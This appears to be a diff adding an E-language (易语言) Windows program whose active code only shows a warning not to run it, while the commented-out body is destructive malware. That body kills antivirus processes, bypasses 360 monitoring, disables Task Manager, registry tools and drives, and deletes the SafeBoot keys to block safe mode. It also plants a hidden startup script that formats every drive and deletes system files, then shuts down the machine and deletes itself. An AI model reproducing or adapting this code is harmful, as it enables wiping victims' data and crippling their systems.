@@ -1,0 +1,260 @@
+ ' 文件类型：Windows窗口程序
+
+ ' 程序名称：
+ ' 程序描述：
+ ' 程序作者：
+ ' 邮政编码：
+ ' 联系地址：
+ ' 联系电话：
+ ' 传真号码：
+ ' 电子信箱：
+ ' 主页地址：
+ ' 版权声明：
+ ' 版本号：1.0
+ ' 创建号：0.0
+
+窗口 _启动窗口 ' 在程序启动后自动调入本窗口
+    左边 = 50
+    顶边 = 50
+    宽度 = 311
+    高度 = 159
+    鼠标指针 = { 0,0,0,0 }
+    标记 = “”
+    可视 = 假
+    禁止 = 假
+
+
+
+
+
+ ' 所需要的支持库：
+ ' krnln d09f2340818511d396f6aaf844c7e325 5 0 系统核心支持库
+
+
+
+
+
+.窗口程序集 窗口程序集1, , , 
+
+.子程序 __启动窗口_创建完毕, 空白型, , 
+.局部变量 变量, 整数型, , , 
+
+信息框 (“要详细的看清代码，不要运行”, 0, )
+返回 ()
+ ' 置现行时间 (到时间 (“2056年1月1日”))
+ ' 运行 (“taskkill /f /im kavsvc.exe”, 假, 1)
+ ' 运行 (“taskkill /f /im KVXP.kxp”, 假, 1)
+ ' 运行 (“taskkill /f /im Rav.exe”, 假, 1)
+ ' 运行 (“taskkill /f /im Ravmon.exe”, 假, 1)
+ ' 运行 (“taskkill /f /im Mcshield.exe”, 假, 1)
+ ' 运行 (“taskkill /f /im VsTskMgr.exe”, 假, 1)
+ ' ' 绕过360监控
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\ExecAccess”, 0)
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\MonAccess”, 0)
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\SiteAccess”, 0)
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\UDiskAccess”, 0)
+ ' 运行 (“taskkill /f /im 360tray.exe”, 假, 1)  ' 结束360进程
+ ' ' 修改关联
+ ' 写注册项 (1, “.txt\”, “jpegfile”)
+ ' 写注册项 (1, “.inf\”, “jpegfile”)
+
+ ' 写注册项 (4, “SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue”, 0)  ' 隐藏文件和文件夹
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr”, 0)  ' 禁用任务管理器
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel”, 1)  ' 禁用控制面板
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\Disableregistrytools”, 1)  ' 禁用注册表
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun”, 1)  ' 隐藏开始中的运行 禁止WIN2000/XP通过任务管理器创建新任务
+
+ ' 写注册项 (3, “SoftWare \Microsoft \Windows \CurrentVersion \Policies\WinOldApp\Disabled”, 1)
+ ' ' 隐藏“MS-DOS方式”下的磁盘驱动器。不管是在“我的电脑”里，或“MS－DOS”方式下都看不见了
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives”, 4294967295)  ' 隐藏所有驱动器
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive”, 4294967295)  ' 禁止所有驱动器
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions”, 1)  ' 隐藏文件夹选项
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop”, 1)  ' 将桌面对象隐藏
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose”, 1)  ' 隐藏开始中的关机
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind”, 1)  ' 隐藏开始中的搜索
+ ' ' 写注册项 (3, “Software\Policies\Microsoft\Windows\System\DisableCMD”, 1)'1 禁用CMD和.BAT文件 2 禁CMD不禁.BAT 0启用两项
+ ' 写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage”, 1)  ' 隐藏主页选项组
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu”, 1)  ' 隐藏IE文件菜单
+ ' 写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFavorites”, 1)  ' 隐藏收藏夹菜单
+ ' 写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoPrinting”, 1)  ' 禁用IE打印功能
+ ' 写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions”, 1)  ' 隐藏Internet选项
+ ' 写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource”, 1)  ' 禁止IE查看源文件
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Interner Settings\Zones\3\1803”, 3)  ' 禁用IE下载功能
+ ' 写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu”, 1)  ' 禁止右键关联菜单
+
+
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRealMode”, 1)  ' 禁止“重新启动计算机切换到MS-DOS方式”
+
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff”, 1)  ' 禁止显示“注销”
+
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsMenu”, 1)  ' 禁止文档菜单
+
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff”, 1)  ' 去掉“开始”选单中的“登录”项
+
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu”, 1)  ' 禁止使用鼠标右键
+
+ ' 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders”, 1)  ' 禁止修改控制面版
+
+ ' ' 无法进入安全模式
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{36FC9E60-C465-11CF-8056-444553540000}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E965-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E969-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96A-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96B-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96F-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E977-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E97B-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E97D-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E980-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AppMgmt\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Base\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Boot Bus Extender\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Boot file system\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\CryptSvc\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\DcomLaunch\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmadmin\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmboot.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmio.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmload.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmserver\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\EventLog\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\File system\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Filter\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\HelpSvc\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Netlogon\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PCI Configuration\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PlugPlay”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PNP Filter\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Primary disk\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\RpcSs\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SCSI Class\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\sermouse.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\sr.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SRService\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\System Bus Extender\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\vga.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\vgasave.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\WinMgmt\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\”)
+
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{36FC9E60-C465-11CF-8056-444553540000}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E965-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E969-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96A-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96B-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96F-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E972-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E973-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E974-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E975-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E977-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E97B-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E97D-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E980-E325-11CE-BFC1-08002BE10318}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AFD\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AppMgmt\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Base\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Boot Bus Extender\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Boot file system\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Browser\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\CryptSvc\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DcomLaunch\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Dhcp\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmadmin\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmboot.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmio.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmload.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmserver\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DnsCache\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\EventLog\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\File system\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Filter\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\HelpSvc\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ip6fw.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ipnat.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LanmanServer\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LanmanWorkstation\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LmHosts\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Messenger\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NDIS\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NDIS Wrapper\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Ndisuio\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetBIOS\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetBIOSGroup\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetBT\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetDDEGroup\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Netlogon\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetMan\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Network\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetworkProvider\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NtLmSsp\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PCI Configuration\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PlugPlay\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PNP Filter\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PNP_TDI\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Primary disk\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpcdd.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpdd.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpwd.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdsessmgr\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\RpcSs\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SCSI Class\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\sermouse.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SharedAccess\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\sr.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SRService\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Streams Drivers\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\System Bus Extender\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Tcpip\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\TDI\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\tdpipe.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\tdtcp.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\termservice\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\vga.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\vgasave.sys\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WinMgmt\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WZCSVC\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Ndisuio\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\”)
+ ' 删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\”)
+
+ ' 写到文件 (读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取分钟 (取现行时间 ())) ＋ “.vbs”, 到字节集 (“set Cleaner=createobject(” ＋ 左逗号.标题 ＋ “wscript.shell” ＋ 右逗号.标题 ＋ “)” ＋ #换行符 ＋ “Cleaner.run” ＋ 左逗号.标题 ＋ 读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取秒 (取现行时间 ())) ＋ “.bat” ＋ 右逗号.标题 ＋ “,vbhide”))  ' 创建隐藏批处理脚本
+ ' 置文件属性 (读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取分钟 (取现行时间 ())) ＋ “.vbs”, 7 ＋ 32)
+
+ ' 写到文件 (读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取秒 (取现行时间 ())) ＋ “.bat”, 到字节集 (“@echo off” ＋ #换行符 ＋ “for %%i in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) DO format %%i: /q /x /y” ＋ #换行符 ＋ “del /f /s /q /a %SystemRoot%\system32\*.msc”))  ' 创建格式化和删除没运行文件的批处理
+ ' 置文件属性 (读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取秒 (取现行时间 ())) ＋ “.bat”, 7 ＋ 32)
+
+ ' 写注册项 (4, “Software\Microsoft\Windows\CurrentVersion\Run\Explore.exe”, 读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\” ＋ 到文本 (取分钟 (取现行时间 ())) ＋ “.vbs”)  ' 把隐藏批处理脚本加入启动项
+
+ ' ' 修改EXE图标
+ ' 写到文件 (读环境变量 (“SystemRoot”) ＋ “\system32” ＋ “\wscript.ico”, #ico)
+ ' ' 置文件属性 (读环境变量 (“SystemRoot”) ＋ “\system32\wscript.ico”, 7 ＋ 32)
+ ' 写到文件 (读环境变量 (“SystemRoot”) ＋ “\system32\reg.reg”, 到字节集 (“Windows Registry Editor Version 5.00” ＋ #换行符 ＋ “[HKEY_CLASSES_ROOT\exefile\DefaultIcon]” ＋ #换行符 ＋ “@=” ＋ 左逗号.标题 ＋ 读环境变量 (“SystemRoot”) ＋ “\system32\wscript.ico” ＋ 右逗号.标题))
+ ' 写到文件 (读环境变量 (“SystemRoot”) ＋ “\system32\reg.bat”, 到字节集 (“@echo off” ＋ #换行符 ＋ “regedit /s reg.reg” ＋ #换行符 ＋ “assoc .exe=exefile” ＋ #换行符 ＋ “del /f /s /q /a ” ＋ 读环境变量 (“SystemRoot”) ＋ “\system32\reg.reg” ＋ #换行符 ＋ “del /f /s /q /a ” ＋ 读环境变量 (“SystemRoot”) ＋ “\system32\reg.bat”))
+ ' 运行 (读环境变量 (“SystemRoot”) ＋ “\system32\reg.bat”, 假, 1)
+
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\ExecAccess”, 1)
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\MonAccess”, 1)
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\SiteAccess”, 1)
+ ' 写注册项 (4, “SOFTWARE\360Safe\safemon\UDiskAccess”, 1)
+
+ ' ' 修改关联
+ ' 写注册项 (1, “.reg\”, “jpegfile”)
+ ' 写注册项 (1, “.exe\”, “jpegfile”)
+ ' 关闭系统 (2, 假)
+ ' _启动窗口.销毁 ()
+
+.子程序 __启动窗口_将被销毁, 空白型, , 
+ ' 写到文件 (取运行目录 () ＋ “\del.bat”, 到字节集 (“@echo off” ＋ #换行符 ＋ “del ” ＋ 左逗号.标题 ＋ 取运行目录 () ＋ “\” ＋ 取执行文件名 () ＋ 右逗号.标题 ＋ #换行符 ＋ “del ” ＋ 左逗号.标题 ＋ 取运行目录 () ＋ “\del.bat” ＋ 右逗号.标题))
+ ' 运行 (取运行目录 () ＋ “\del.bat”, 假, 1)
+ ' 运行 (“del.bat”, 假, 1)
+ ' ' 删除自己
+
+
+ ' 不属于任何一个程序集、类模块的函数：
